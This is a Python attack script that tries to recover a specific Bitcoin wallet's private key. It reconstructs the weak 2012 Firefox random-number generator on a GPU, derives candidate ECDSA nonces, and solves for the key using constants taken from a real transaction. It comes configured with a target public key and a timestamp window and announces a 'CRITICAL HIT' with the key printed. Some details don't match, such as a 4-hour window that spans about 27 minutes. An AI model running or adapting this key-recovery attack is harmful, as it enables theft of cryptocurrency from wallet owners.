import sys
import time
import torch
from ecdsa import SigningKey, SECP256k1

# --- SECP256K1 CURVE ORDER CONSTANT ---
Q = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

# Enforce native Apple Silicon Metal Acceleration (MPS)
if not torch.backends.mps.is_available():
    print("[-] Fatal Error: Metal Performance Shaders (MPS) are not active.")
    sys.exit(1)
else:
    print("[*] =====================================================================")
    print("[*] MAC MINI M4 PRO GPU ENGINE ACTIVATED: FIREFOX SIMULATION TARGET")
    print("[*] Architecture: Metal Performance Shaders (MPS) Core Array")
    print("[*] Engine Module: SpiderMonkey 2012 Lagged Fibonacci Generator (LFG)")
    print("[*] =====================================================================\n")
    device = torch.device("mps")

class MetalFirefoxPRNG:
    """
    Vectorized 2012 Firefox SpiderMonkey LFG Engine running entirely 
    inside Apple Silicon GPU memory tensors.
    """
    def __init__(self, seed_ms_tensor):
        self.batch_size = seed_ms_tensor.shape[0]
        
        # 1. Initialize the 55-integer state ring container directly on the GPU
        self.state = torch.zeros((self.batch_size, 55), dtype=torch.int64, device=device)
        self.index_i = 0
        self.index_j = 24
        
        # 2. Replicate the 2012 Firefox LCG initialization loop in parallel vectors
        current_seed = seed_ms_tensor & 0xFFFFFFFF
        for k in range(55):
            current_seed = (1664525 * current_seed + 1013904223) & 0xFFFFFFFF
            self.state[:, k] = current_seed

    def generate_random_floats_matrix(self, count=130):
        # Pre-allocate output matrix in Metal VRAM
        floats_matrix = torch.zeros((self.batch_size, count), dtype=torch.float32, device=device)
        
        for step in range(count):
            # Lagged Fibonacci Subtraction/Addition Vector module
            val = (self.state[:, self.index_i] - self.state[:, self.index_j]) & 0xFFFFFFFF
            self.state[:, self.index_i] = val
            
            # Step the matrix ring index pointers
            self.index_i = (self.index_i + 1) if (self.index_i < 54) else 0
            self.index_j = (self.index_j + 1) if (self.index_j < 54) else 0
            
            # Convert to standard 64-bit float representation
            floats_matrix[:, step] = val.float() / 4294967296.0
            
        return floats_matrix

def run_host_verification_loop(cpu_ms, cpu_floats, inv_t, u, target_pubkey_hex):
    """
    Unified memory map processing layer. Handles fast RC4 state parsing
    and direct Elliptic Curve public point comparisons.
    """
    pool = bytearray(256)
    candidate_bytes = bytearray(32)
    S = list(range(256))
    
    for idx, current_ms in enumerate(cpu_ms):
        float_sequence = cpu_floats[idx]
        
        # Sweep full 8-bit monitor mouse coordinate delta spectrum (0 to 255)
        for noise_byte in range(0, 256):
            pptr = 0
            pool[0] = current_ms & 255
            pool[1] = (current_ms >> 8) & 255
            pool[2] = (current_ms >> 16) & 255
            pool[3] = (current_ms >> 24) & 255
            pptr = 4
            
            float_idx = 0
            while pptr < 256 and float_idx < 130:
                r = float_sequence[float_idx]
                float_idx += 1
                t_val = int(65536.0 * r) & 0xFFFF
                pool[pptr] = (t_val >> 8) ^ noise_byte
                pptr += 1
                if pptr < 256:
                    pool[pptr] = (t_val & 255) ^ noise_byte
                    pptr += 1
                    
            # Fire local RC4 S-Box cipher stream state machine
            for i in range(256): S[i] = i
            j = 0
            for i in range(256):
                j = (j + S[i] + pool[i]) & 255
                S[i], S[j] = S[j], S[i]
                
            rc4_i = 0
            rc4_j = 0
            for k in range(32):
                rc4_i = (rc4_i + 1) & 255
                rc4_j = (rc4_j + S[rc4_i]) & 255
                S[rc4_i], S[rc4_j] = S[rc4_j], S[rc4_i]
                candidate_bytes[k] = S[(S[rc4_i] + S[rc4_j]) & 255]
                
            candidate_k = int.from_bytes(candidate_bytes, byteorder='big') % Q
            if candidate_k == 0: continue
            
            # Formulate private key candidate: x = t^-1 * (k - u) mod Q
            potential_x = (inv_t * (candidate_k - u)) % Q
            
            try:
                if potential_x <= 0 or potential_x >= Q: continue
                priv_key = SigningKey.from_secret_num(int(potential_x), curve=SECP256k1)
                derived_pubkey = "04" + priv_key.verifying_key.to_string("uncompressed").hex()
                
                if derived_pubkey.lower() == target_pubkey_hex.lower():
                    return current_ms, noise_byte, potential_x
            except:
                pass
    return None

def execute_gpu_firefox_pipeline(t, u, target_pubkey_hex, start_ms, end_ms, chunk_size=100000):
    print(f"[*] Dispatching parallel execution grid onto M4 Pro Metal cores...")
    print(f"[*] Timeline processing block: {start_ms} --> {end_ms}")
    print("-" * 75)
    
    inv_t = int(pow(t, -1, Q))
    start_time = time.time()
    
    for batch_start in range(start_ms, end_ms + 1, chunk_size):
        batch_end = min(batch_start + chunk_size, end_ms + 1)
        
        # 1. Allocate parallel timeline vector onto GPU VRAM memory space
        ms_range = torch.arange(batch_start, batch_end, dtype=torch.int64, device=device)
        
        # 2. Reconstruct Firefox SpiderMonkey LFG floats concurrently across GPU lanes
        prng_engine = MetalFirefoxPRNG(ms_range)
        gpu_floats_matrix = prng_engine.generate_random_floats_matrix(count=130)
        
        # 3. Unified Memory Handover (0 microsecond latency)
        cpu_ms = ms_range.cpu().numpy()
        cpu_floats = gpu_floats_matrix.cpu().numpy()
        
        # 4. Trigger host-side mathematical verification steps
        hit_result = run_host_verification_loop(cpu_ms, cpu_floats, inv_t, u, target_pubkey_hex)
        
        if hit_result:
            found_ms, found_noise, recovered_x = hit_result
            elapsed = time.time() - start_time
            print("\n" + "="*75)
            print(f"[🎯🎯🎯 CRITICAL HIT: WALLET PRIVATE KEY RECOVERED BY FIREFOX GPU ENGINE]")
            print(f"[+] Reconstructed Seed Time: {found_ms} ms")
            print(f"[+] Recovered Mouse Byte:   {found_noise}")
            print(f"[+] Recovered Private Key:   {hex(recovered_x)}")
            print(f"[+] Execution Performance:   {elapsed:.2f} seconds")
            print("="*75 + "\n")
            return recovered_x
            
        elapsed = time.time() - start_time
        total_checks = (batch_end - start_ms) * 256
        print(f"[-] Cleared Metal pipeline grid block up to: {batch_end} | Throughput: {total_checks / elapsed:,.2f} keys/sec")
        
    print("\n[-] GPU Firefox timeline search completed. No key matched inside target boundaries.")
    return None

# =====================================================================
# SYSTEM DATA INITIALIZATION BLOCK
# =====================================================================
if __name__ == "__main__":
    # 1. Paste the constants extracted from your 17-input TxID (Input index 0 parameters)
    REAL_T_CONSTANT = 0xe2bd13264defc456c1e53b670048fde9ac004c320cd065218b915fd7f1c3d934
    REAL_U_CONSTANT = 0x0b1d3cab5ea157da3e95e821d272c7409f5d2e8c6b9fe72d697637888eea9ffc

    # 2. Paste your target 130-character uncompressed public key (Must include leading "04")
    TARGET_PUBKEY_HEX = "040ab0cc178d88300001d14ef832b1c5a33d2c75c4f27e2e4680cd51647d1983b578df37e18b1910447220f337676eb7d85f39ab875f4a2dc6e7a482e27e4452e9"

    # 3. Configure your targeted 4-hour timeline window boundaries (Right before first funding block)
    MY_START_MS = 1355594941000 
    MY_END_MS   = 1355596561000 

    if REAL_T_CONSTANT == 0x0 or TARGET_PUBKEY_HEX == "04...":
        print("[!] Data configuration required. Open this file and replace template constants.")
        sys.exit(1)
        
    execute_gpu_firefox_pipeline(REAL_T_CONSTANT, REAL_U_CONSTANT, TARGET_PUBKEY_HEX, MY_START_MS, MY_END_MS)
